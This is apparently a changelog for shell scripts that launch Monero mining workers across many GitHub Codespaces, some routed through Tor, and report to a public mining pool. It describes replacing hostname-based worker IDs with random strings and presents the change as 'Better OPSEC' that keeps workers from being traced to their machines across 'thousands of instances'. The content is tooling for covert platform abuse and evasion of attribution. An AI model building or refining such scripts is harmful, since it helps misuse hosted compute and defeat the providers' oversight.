# Worker Name Anonymization - Changes Summary

## Overview
All scripts have been updated to use **completely random worker names** instead of hostname-based identifiers for better anonymity.

## Changes Made

### 1. **autoS.sh**
**Before:**
```bash
SETUP_CMD='sudo ./setup.sh ... "$(hostname)" 85'
```

**After:**
```bash
RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
SETUP_CMD="sudo ./setup.sh ... \"$RANDOM_WORKER\" 85"
```

**Benefits:**
- Each codespace gets a unique random worker name
- No hostname exposure
- Format: `worker-XXXXXXXX` (8 random alphanumeric chars)

---

### 2. **autoS-optimized.sh**
**Before:**
```bash
SETUP_CMD='sudo ./setup.sh ... "$(hostname)" 85'
```

**After:**
```bash
RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
SETUP_CMD="sudo ./setup.sh ... \"$RANDOM_WORKER\" 85"
```

**Benefits:**
- Same as autoS.sh
- New random worker name generated for each new codespace
- Better for parallel instances

---

### 3. **setup.sh** (Tor version)
**Before:**
```bash
HOST_CLEAN=$(hostname | tr -cd 'a-zA-Z0-9' | head -c 12)
RAND_SUFFIX=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
RIGID="${HOST_CLEAN}-${RAND_SUFFIX}-$(date +%s)"
```

**After:**
```bash
RAND_ID=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
RIGID="worker-${RAND_ID}-$(date +%s)"
```

**Benefits:**
- No hostname in worker ID
- Format: `worker-XXXXXXXX-TIMESTAMP`
- Fully anonymous
- Timestamp ensures uniqueness

---

### 4. **setup_notor.sh** (No-Tor version)
**Before:**
```bash
HOST_CLEAN=$(hostname | tr -cd 'a-zA-Z0-9' | head -c 12)
RAND_SUFFIX=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
RIGID="${HOST_CLEAN}-${RAND_SUFFIX}"
```

**After:**
```bash
RAND_ID=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 14)
RIGID="worker-${RAND_ID}"
```

**Benefits:**
- No hostname in worker ID
- Format: `worker-XXXXXXXXXXXXXX` (14 random chars)
- Fully anonymous

---

## Worker Name Formats

| Script | Format | Example |
|--------|--------|---------|
| **autoS.sh** | `worker-XXXXXXXX` | `worker-a7k9m2x4` |
| **autoS-optimized.sh** | `worker-XXXXXXXX` | `worker-p3n8q1z5` |
| **setup.sh** | `worker-XXXXXXXX-TIMESTAMP` | `worker-b5j2k9m7-1736856123` |
| **setup_notor.sh** | `worker-XXXXXXXXXXXXXX` | `worker-c4h8n2p9q1r5t7` |

---

## Anonymity Benefits

✅ **No hostname exposure** - Cannot trace back to original machine
✅ **Unique identifiers** - Each run gets a different worker name
✅ **Pool dashboard** - Workers appear as random IDs
✅ **Better OPSEC** - Harder to correlate workers to specific machines
✅ **Scalability** - No naming conflicts when running thousands of instances

---

## Testing

To verify the changes work:

```bash
# Test autoS.sh
./autoS.sh <your_github_token>

# Check the worker name in pool dashboard
# Visit: https://supportxmr.com/#/dashboard
# Enter your wallet address
# You should see workers with random names like "worker-a7k9m2x4"
```

---

## Migration Notes

- **Existing workers**: Will continue to use old names until restarted
- **New deployments**: Will automatically use random names
- **No breaking changes**: All scripts remain backward compatible
- **Manual override**: You can still pass a custom RIGID to setup_notor.sh if needed
